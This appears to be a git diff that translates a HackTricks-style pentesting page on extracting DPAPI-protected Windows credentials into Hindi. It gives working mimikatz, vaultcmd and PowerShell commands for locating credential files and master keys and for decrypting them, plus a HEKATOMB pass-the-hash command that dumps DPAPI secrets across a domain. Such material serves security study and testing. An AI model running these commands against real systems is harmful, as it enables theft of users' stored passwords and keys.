@@ -1,29 +1,28 @@
-# DPAPI - Extracting Passwords
+# DPAPI - पासवर्ड निकालना
 
 {{#include ../../banners/hacktricks-training.md}}
 
 <figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>
 
-​​[**RootedCON**](https://www.rootedcon.com/) is the most relevant cybersecurity event in **Spain** and one of the most important in **Europe**. With **the mission of promoting technical knowledge**, this congress is a boiling meeting point for technology and cybersecurity professionals in every discipline.
+​​[**RootedCON**](https://www.rootedcon.com/) **स्पेन** में सबसे प्रासंगिक साइबर सुरक्षा कार्यक्रम है और **यूरोप** में सबसे महत्वपूर्ण में से एक है। **तकनीकी ज्ञान को बढ़ावा देने** के मिशन के साथ, यह कांग्रेस हर अनुशासन में प्रौद्योगिकी और साइबर सुरक्षा पेशेवरों के लिए एक उष्णकटिबंधीय बैठक बिंदु है।
 
 {% embed url="https://www.rootedcon.com/" %}
 
-## What is DPAPI
+## DPAPI क्या है
 
-The Data Protection API (DPAPI) is primarily utilized within the Windows operating system for the **symmetric encryption of asymmetric private keys**, leveraging either user or system secrets as a significant source of entropy. This approach simplifies encryption for developers by enabling them to encrypt data using a key derived from the user's logon secrets or, for system encryption, the system's domain authentication secrets, thus obviating the need for developers to manage the protection of the encryption key themselves.
+डेटा प्रोटेक्शन एपीआई (DPAPI) मुख्य रूप से **सामान्य निजी कुंजियों के लिए सममित एन्क्रिप्शन** के लिए विंडोज ऑपरेटिंग सिस्टम के भीतर उपयोग किया जाता है, जो उपयोगकर्ता या सिस्टम रहस्यों को महत्वपूर्ण एंट्रॉपी के स्रोत के रूप में उपयोग करता है। यह दृष्टिकोण डेवलपर्स के लिए एन्क्रिप्शन को सरल बनाता है, जिससे उन्हें उपयोगकर्ता के लॉगिन रहस्यों से निकाली गई कुंजी का उपयोग करके डेटा एन्क्रिप्ट करने की अनुमति मिलती है या, सिस्टम एन्क्रिप्शन के लिए, सिस्टम के डोमेन प्रमाणीकरण रहस्यों का उपयोग करके, इस प्रकार डेवलपर्स को एन्क्रिप्शन कुंजी की सुरक्षा का प्रबंधन करने की आवश्यकता को समाप्त करता है।
 
-### Protected Data by DPAPI
+### DPAPI द्वारा संरक्षित डेटा
 
-Among the personal data protected by DPAPI are:
+DPAPI द्वारा संरक्षित व्यक्तिगत डेटा में शामिल हैं:
 
-- Internet Explorer and Google Chrome's passwords and auto-completion data
-- E-mail and internal FTP account passwords for applications like Outlook and Windows Mail
-- Passwords for shared folders, resources, wireless networks, and Windows Vault, including encryption keys
-- Passwords for remote desktop connections, .NET Passport, and private keys for various encryption and authentication purposes
-- Network passwords managed by Credential Manager and personal data in applications using CryptProtectData, such as Skype, MSN messenger, and more
+- इंटरनेट एक्सप्लोरर और गूगल क्रोम के पासवर्ड और ऑटो-कंप्लीशन डेटा
+- आउटलुक और विंडोज मेल जैसे अनुप्रयोगों के लिए ई-मेल और आंतरिक FTP खाता पासवर्ड
+- साझा फ़ोल्डरों, संसाधनों, वायरलेस नेटवर्क और विंडोज वॉल्ट के लिए पासवर्ड, जिसमें एन्क्रिप्शन कुंजियाँ शामिल हैं
+- रिमोट डेस्कटॉप कनेक्शनों, .NET पासपोर्ट, और विभिन्न एन्क्रिप्शन और प्रमाणीकरण उद्देश्यों के लिए निजी कुंजियों के लिए पासवर्ड
+- क्रेडेंशियल मैनेजर द्वारा प्रबंधित नेटवर्क पासवर्ड और क्रिप्टप्रोटेक्टडेटा का उपयोग करने वाले अनुप्रयोगों में व्यक्तिगत डेटा, जैसे कि स्काइप, MSN मैसेंजर, और अधिक
 
-## List Vault
-
+## लिस्ट वॉल्ट
 ```bash
 # From cmd
 vaultcmd /listcreds:"Windows Credentials" /all
@@ -31,20 +30,16 @@ vaultcmd /listcreds:"Windows Credentials" /all
 # From mimikatz
 mimikatz vault::list
 ```
-
 ## Credential Files
 
 The **credentials files protected** could be located in:
-
 ```
 dir /a:h C:\Users\username\AppData\Local\Microsoft\Credentials\
 dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\
 Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
 Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
 ```
-
-Get credentials info using mimikatz `dpapi::cred`, in the response you can find interesting info such as the encrypted data and the guidMasterKey.
-
+mimikatz `dpapi::cred` का उपयोग करके क्रेडेंशियल्स जानकारी प्राप्त करें, प्रतिक्रिया में आपको एन्क्रिप्टेड डेटा और guidMasterKey जैसी दिलचस्प जानकारी मिल सकती है।
 ```bash
 mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\28350839752B38B238E5D56FDD7891A7
 
@@ -54,17 +49,13 @@ guidMasterKey      : {3e90dd9e-f901-40a1-b691-84d7f647b8fe}
 pbData             : b8f619[...snip...]b493fe
 [..]
 ```
-
-You can use **mimikatz module** `dpapi::cred` with the appropiate `/masterkey` to decrypt:
-
+आप **mimikatz module** `dpapi::cred` का उपयोग उचित `/masterkey` के साथ डिक्रिप्ट करने के लिए कर सकते हैं:
 ```
 dpapi::cred /in:C:\path\to\encrypted\file /masterkey:<MASTERKEY>
 ```
+## मास्टर कुंजी
 
-## Master Keys
-
-The DPAPI keys used for encrypting the user's RSA keys are stored under `%APPDATA%\Microsoft\Protect\{SID}` directory, where {SID} is the [**Security Identifier**](https://en.wikipedia.org/wiki/Security_Identifier) **of that user**. **The DPAPI key is stored in the same file as the master key that protects the users private keys**. It usually is 64 bytes of random data. (Notice that this directory is protected so you cannot list it using`dir` from the cmd, but you can list it from PS).
-
+DPAPI कुंजी जो उपयोगकर्ता की RSA कुंजियों को एन्क्रिप्ट करने के लिए उपयोग की जाती हैं, `%APPDATA%\Microsoft\Protect\{SID}` निर्देशिका के तहत संग्रहीत होती हैं, जहाँ {SID} उस उपयोगकर्ता का [**सुरक्षा पहचानकर्ता**](https://en.wikipedia.org/wiki/Security_Identifier) है। **DPAPI कुंजी उसी फ़ाइल में संग्रहीत होती है जिसमें उपयोगकर्ताओं की निजी कुंजियों की सुरक्षा करने वाली मास्टर कुंजी होती है**। यह आमतौर पर 64 बाइट्स का यादृच्छिक डेटा होता है। (ध्यान दें कि यह निर्देशिका सुरक्षित है इसलिए आप इसे `dir` का उपयोग करके cmd से सूचीबद्ध नहीं कर सकते, लेकिन आप इसे PS से सूचीबद्ध कर सकते हैं)।
 ```bash
 Get-ChildItem C:\Users\USER\AppData\Roaming\Microsoft\Protect\
 Get-ChildItem C:\Users\USER\AppData\Local\Microsoft\Protect
@@ -73,45 +64,43 @@ Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\
 Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\{SID}
 Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\{SID}
 ```
-
-This is what a bunch of Master Keys of a user will looks like:
+यह एक उपयोगकर्ता के कई मास्टर कुंजी कैसे दिखते हैं:
 
 ![](<../../images/image (1121).png>)
 
-Usually **each master keys is an encrypted symmetric key that can decrypt other content**. Therefore, **extracting** the **encrypted Master Key** is interesting in order to **decrypt** later that **other content** encrypted with it.
+आमतौर पर **प्रत्येक मास्टर कुंजी एक एन्क्रिप्टेड सिमेट्रिक कुंजी होती है जो अन्य सामग्री को डिक्रिप्ट कर सकती है**। इसलिए, **एन्क्रिप्टेड मास्टर कुंजी को निकालना** दिलचस्प है ताकि बाद में **उस अन्य सामग्री** को **डिक्रिप्ट** किया जा सके जो इसके साथ एन्क्रिप्ट की गई है।
 
-### Extract master key & decrypt
+### मास्टर कुंजी निकालें और डिक्रिप्ट करें
 
-Check the post [https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#extracting-dpapi-backup-keys-with-domain-admin) for an example of how to extract the master key and decrypt it.
+मास्टर कुंजी निकालने और उसे डिक्रिप्ट करने के उदाहरण के लिए पोस्ट देखें [https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#extracting-dpapi-backup-keys-with-domain-admin)।
 
 ## SharpDPAPI
 
-[SharpDPAPI](https://github.com/GhostPack/SharpDPAPI#sharpdpapi-1) is a C# port of some DPAPI functionality from [@gentilkiwi](https://twitter.com/gentilkiwi)'s [Mimikatz](https://github.com/gentilkiwi/mimikatz/) project.
+[SharpDPAPI](https://github.com/GhostPack/SharpDPAPI#sharpdpapi-1) कुछ DPAPI कार्यक्षमता का C# पोर्ट है [@gentilkiwi](https://twitter.com/gentilkiwi) के [Mimikatz](https://github.com/gentilkiwi/mimikatz/) प्रोजेक्ट से।
 
 ## HEKATOMB
 
-[**HEKATOMB**](https://github.com/Processus-Thief/HEKATOMB) is a tool that automates the extraction of all users and computers from the LDAP directory and the extraction of domain controller backup key through RPC. The script will then resolve all computers ip address and perform a smbclient on all computers to retrieve all DPAPI blobs of all users and decrypt everything with domain backup key.
+[**HEKATOMB**](https://github.com/Processus-Thief/HEKATOMB) एक उपकरण है जो LDAP निर्देशिका से सभी उपयोगकर्ताओं और कंप्यूटरों को निकालने और RPC के माध्यम से डोमेन नियंत्रक बैकअप कुंजी निकालने को स्वचालित करता है। स्क्रिप्ट फिर सभी कंप्यूटरों के आईपी पते को हल करेगी और सभी कंप्यूटरों पर smbclient प्रदर्शन करेगी ताकि सभी उपयोगकर्ताओं के सभी DPAPI ब्लॉब्स को पुनः प्राप्त किया जा सके और सब कुछ डोमेन बैकअप कुंजी के साथ डिक्रिप्ट किया जा सके।
 
 `python3 hekatomb.py -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 -debug -dnstcp`
 
-With extracted from LDAP computers list you can find every sub network even if you didn't know them !
+LDAP से निकाले गए कंप्यूटरों की सूची के साथ आप हर उप नेटवर्क को ढूंढ सकते हैं भले ही आप उन्हें नहीं जानते हों!
 
-"Because Domain Admin rights are not enough. Hack them all."
+"क्योंकि डोमेन एडमिन अधिकार पर्याप्त नहीं हैं। सभी को हैक करें।"
 
 ## DonPAPI
 
-[**DonPAPI**](https://github.com/login-securite/DonPAPI) can dump secrets protected by DPAPI automatically.
+[**DonPAPI**](https://github.com/login-securite/DonPAPI) स्वचालित रूप से DPAPI द्वारा संरक्षित रहस्यों को डंप कर सकता है।
 
-## References
+## संदर्भ
 
 - [https://www.passcape.com/index.php?section=docsys\&cmd=details\&id=28#13](https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13)
 - [https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c)
 
 <figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>
 
-[**RootedCON**](https://www.rootedcon.com/) is the most relevant cybersecurity event in **Spain** and one of the most important in **Europe**. With **the mission of promoting technical knowledge**, this congress is a boiling meeting point for technology and cybersecurity professionals in every discipline.
+[**RootedCON**](https://www.rootedcon.com/) **स्पेन** में सबसे प्रासंगिक साइबर सुरक्षा कार्यक्रम है और **यूरोप** में सबसे महत्वपूर्ण में से एक है। **तकनीकी ज्ञान को बढ़ावा देने** के मिशन के साथ, यह कांग्रेस हर अनुशासन में प्रौद्योगिकी और साइबर सुरक्षा पेशेवरों के लिए एक उबालता हुआ बैठक बिंदु है।
 
 {% embed url="https://www.rootedcon.com/" %}
 
 {{#include ../../banners/hacktricks-training.md}}
-
